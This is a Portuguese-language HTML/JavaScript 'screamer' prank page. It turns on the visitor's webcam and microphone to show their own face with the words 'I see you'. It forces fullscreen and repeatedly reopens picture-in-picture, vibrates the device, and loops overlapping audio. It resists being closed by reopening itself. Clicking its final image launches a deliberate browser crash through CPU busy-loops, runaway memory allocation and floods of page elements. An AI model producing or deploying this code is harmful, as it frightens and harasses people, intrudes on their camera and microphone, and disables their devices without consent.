<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sistema</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            width: 100vw;
            height: 100vh;
        }
        video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }
        #start {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            color: #0f0;
            font-size: 2em;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            cursor: pointer;
        }
        .terminal-text {
            position: fixed;
            bottom: 20px;
            left: 20px;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            z-index: 850;
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.9);
            padding: 10px;
            border: 1px solid #0f0;
            width: 500px;
        }
        #userVideo {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 300px;
            height: 200px;
            border: 3px solid #ff0000;
            z-index: 950;
            background: #000;
        }
        .final-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 20000;
            display: none;
            cursor: pointer;
        }
        .final-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
            background: #000;
        }
        .crash-element {
            position: fixed;
            font-size: 24px;
            z-index: 99999;
            pointer-events: none;
            animation: float 3s infinite;
        }
        .matrix-code {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            pointer-events: none;
            z-index: 800;
            font-family: 'Courier New', monospace;
            color: #0f0;
            font-size: 14px;
        }
        .code-char {
            position: absolute;
            color: #0f0;
            animation: fall 3s linear forwards;
            text-shadow: 0 0 8px #0f0;
        }
        .audio-overlay {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 20px;
            font-size: 3em;
            z-index: 10000;
            display: none;
            text-align: center;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
            50% { transform: translateY(-50px) rotate(180deg); opacity: 0.7; }
        }
        @keyframes fall {
            0% { transform: translateY(-100px); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
            20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
    </style>
</head>
<body>
    <div id="start">üö® INICIAR SISTEMA DE TRAVAMENTO üö®</div>
    <video id="video" playsinline loop muted>
        <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
    </video>
    <video id="userVideo" autoplay muted playsinline style="display: none;"></video>
    <div class="terminal-text" id="terminal"></div>
    <div class="matrix-code" id="matrixCode"></div>
    <div class="audio-overlay" id="audioOverlay">EU VEJO VOC√ä</div>
    
    <div class="final-container" id="finalContainer">
        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg">
    </div>

    <audio id="persistentAudio" loop>
        <source src="https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3" type="audio/mpeg">
    </audio>

    <script>
        const start = document.getElementById("start");
        const video = document.getElementById("video");
        const userVideo = document.getElementById("userVideo");
        const terminal = document.getElementById("terminal");
        const matrixCode = document.getElementById("matrixCode");
        const audioOverlay = document.getElementById("audioOverlay");
        const finalContainer = document.getElementById("finalContainer");
        const persistentAudio = document.getElementById("persistentAudio");

        let localStream = null;
        let audioClips = [];
        let crashIntervals = [];
        let finalPhase = false;

        function updateTerminal(message) {
            terminal.textContent += `[${new Date().toLocaleTimeString()}] ${message}\n`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // **SISTEMA DE √ÅUDIO QUE FUNCIONA**
        function setupAudioSystem() {
            updateTerminal("üîä INICIANDO SISTEMA DE √ÅUDIO...");
            
            for (let i = 0; i < 10; i++) {
                const audio = new Audio();
                audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
                audio.volume = 0.8;
                audio.preload = "auto";
                audioClips.push(audio);
            }
            
            // Tocar √°udio quando usu√°rio interage
            const playAllAudio = () => {
                audioClips.forEach((audio, index) => {
                    setTimeout(() => {
                        audio.currentTime = 0;
                        audio.play().catch(e => {
                            audio.muted = true;
                            audio.play();
                        });
                    }, index * 400);
                });
                
                audioOverlay.style.display = 'block';
                setTimeout(() => audioOverlay.style.display = 'none', 3000);
            };
            
            document.addEventListener('click', playAllAudio);
            document.addEventListener('keydown', playAllAudio);
        }

        // **EFEITO MATRIX**
        function createMatrixEffect() {
            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";

            setInterval(() => {
                for (let i = 0; i < 8; i++) {
                    const charElement = document.createElement('div');
                    charElement.className = 'code-char';
                    charElement.textContent = chars[Math.floor(Math.random() * chars.length)];
                    charElement.style.left = Math.random() * 100 + 'vw';
                    charElement.style.fontSize = (12 + Math.random() * 10) + 'px';
                    charElement.style.animationDuration = (2 + Math.random() * 3) + 's';

                    matrixCode.appendChild(charElement);

                    setTimeout(() => {
                        charElement.remove();
                    }, 5000);
                }
            }, 100);
        }

        // **SISTEMA DE C√ÇMERA**
        async function startCamera() {
            try {
                updateTerminal("üìπ INICIANDO C√ÇMERA...");
                
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: true
                };

                localStream = await navigator.mediaDevices.getUserMedia(constraints);
                userVideo.srcObject = localStream;
                userVideo.style.display = 'block';
                
                updateTerminal("‚úÖ C√ÇMERA ATIVA");
                
            } catch (error) {
                updateTerminal("‚ùå C√ÇMERA BLOQUEADA");
            }
        }

        // **PIP AUTOM√ÅTICO**
        async function activatePIP() {
            if (!document.pictureInPictureEnabled) {
                updateTerminal("‚ùå PIP N√ÉO SUPORTADO");
                return;
            }

            try {
                await video.requestPictureInPicture();
                updateTerminal("‚úÖ PIP ATIVADO");
                
                video.addEventListener('leavepictureinpicture', () => {
                    updateTerminal("‚ö†Ô∏è PIP FECHADO - REATIVANDO...");
                    setTimeout(activatePIP, 1000);
                });
                
            } catch (error) {
                updateTerminal("‚ùå ERRO PIP: " + error.message);
            }
        }

        // **TELA CHEIA**
        function forceFullscreen() {
            try {
                document.documentElement.requestFullscreen();
                updateTerminal("‚úÖ TELA CHEIA ATIVADA");
            } catch (e) {
                updateTerminal("‚ùå TELA CHEIA BLOQUEADA");
            }
        }

        // **VIBRA√á√ÉO PESADA**
        function startHeavyVibration() {
            if (navigator.vibrate) {
                updateTerminal("üì≥ INICIANDO VIBRA√á√ÉO...");
                
                setInterval(() => {
                    navigator.vibrate([2000, 500, 2000, 500, 2000]);
                }, 6000);
            } else {
                updateTerminal("‚ùå VIBRA√á√ÉO N√ÉO SUPORTADA");
            }
        }

        // **FASE FINAL**
        function activateFinalPhase() {
            if (finalPhase) return;
            
            finalPhase = true;
            updateTerminal("üíÄ ATIVANDO FASE FINAL...");
            
            video.style.display = 'none';
            userVideo.style.display = 'none';
            finalContainer.style.display = 'block';
            
            if (document.pictureInPictureElement) {
                document.exitPictureInPicture();
            }
            
            forceFullscreen();
            
            // Tocar √°udio na fase final
            audioClips.forEach(audio => {
                audio.play().catch(e => {
                    audio.muted = true;
                    audio.play();
                });
            });
        }

        // **TRAVAMENTO PESADO DE VERDADE**
        function startHeavyCrash() {
            updateTerminal("üí• INICIANDO TRAVAMENTO PESADO...");
            
            // PARAR INTERVALOS ANTERIORES
            crashIntervals.forEach(interval => clearInterval(interval));
            crashIntervals = [];

            // 1. CPU 100% - BLOQUEIO COMPLETO
            const cpuCrash = setInterval(() => {
                const startTime = Date.now();
                while (Date.now() - startTime < 5000) {
                    for (let i = 0; i < 10000000; i++) {
                        const a = Math.random();
                        const b = Math.random();
                        const result = Math.sin(a) * Math.cos(b) * Math.tan(a * b);
                        const array = new Array(100000).fill(result);
                        const sum = array.reduce((acc, val) => acc + val, 0);
                    }
                }
            }, 10);
            crashIntervals.push(cpuCrash);

            // 2. MAIS CPU
            const cpuCrash2 = setInterval(() => {
                let total = 0;
                for (let i = 0; i < 50000000; i++) {
                    total += Math.sqrt(Math.random()) * Math.log(Math.random() + 1);
                }
            }, 10);
            crashIntervals.push(cpuCrash2);

            // 3. MEM√ìRIA ESGOTADA
            const memoryArrays = [];
            const memoryCrash = setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    memoryArrays.push(new Array(100000).fill('CRASH_' + Date.now()));
                }
            }, 500);
            crashIntervals.push(memoryCrash);

            // 4. ELEMENTOS NA TELA
            const elementCrash = setInterval(() => {
                for (let i = 0; i < 200; i++) {
                    const el = document.createElement('div');
                    el.className = 'crash-element';
                    el.style.left = Math.random() * window.innerWidth + 'px';
                    el.style.top = Math.random() * window.innerHeight + 'px';
                    el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    el.style.fontSize = (15 + Math.random() * 50) + 'px';
                    el.textContent = 'üíÄ';
                    document.body.appendChild(el);
                    
                    setTimeout(() => el.remove(), 5000);
                }
            }, 300);
            crashIntervals.push(elementCrash);

            // 5. V√çDEO TRAVADO
            const videoCrash = setInterval(() => {
                video.style.filter = `
                    hue-rotate(${Math.random() * 360}deg)
                    contrast(${100 + Math.random() * 300}%)
                    brightness(${50 + Math.random() * 100}%)
                `;
                video.playbackRate = 0.1 + Math.random() * 2;
            }, 400);
            crashIntervals.push(videoCrash);

            // 6. √ÅUDIO TRAVADO
            const audioCrash = setInterval(() => {
                audioClips.forEach(audio => {
                    audio.currentTime = Math.random() * 3;
                    audio.playbackRate = 0.3 + Math.random() * 1.5;
                    audio.play().catch(e => {
                        audio.muted = true;
                        audio.play();
                    });
                });
                
                audioOverlay.style.display = 'block';
                setTimeout(() => audioOverlay.style.display = 'none', 2000);
            }, 5000);
            crashIntervals.push(audioCrash);

            // 7. EFEITOS VISUAIS
            const visualCrash = setInterval(() => {
                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 8%)`;
                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
            }, 200);
            crashIntervals.push(visualCrash);

            updateTerminal("‚úÖ TRAVAMENTO PESADO ATIVADO");
        }

        // **INICIAR SISTEMA COMPLETO**
        start.addEventListener("click", async () => {
            start.style.display = "none";
            updateTerminal("üöÄ INICIANDO SISTEMA COMPLETO...");

            setupAudioSystem();
            createMatrixEffect();
            await startCamera();
            
            video.play().catch(e => {
                video.muted = true;
                video.play();
            });

            forceFullscreen();
            setTimeout(activatePIP, 2000);
            setTimeout(startHeavyVibration, 3000);

            // FASE FINAL EM 20 SEGUNDOS
            setTimeout(() => {
                activateFinalPhase();
            }, 20000);

            updateTerminal("‚úÖ SISTEMA ATIVO - FASE FINAL EM 20s");
        });

        // **CLIQUE NA FOTO = TRAVAMENTO PESADO**
        finalContainer.addEventListener("click", () => {
            startHeavyCrash();
        });

        // **BLOQUEAR FECHAMENTO**
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            if (!finalPhase) {
                window.open(window.location.href, '_blank');
            }
            e.returnValue = '';
            return '';
        });

    </script>
</body>
</html>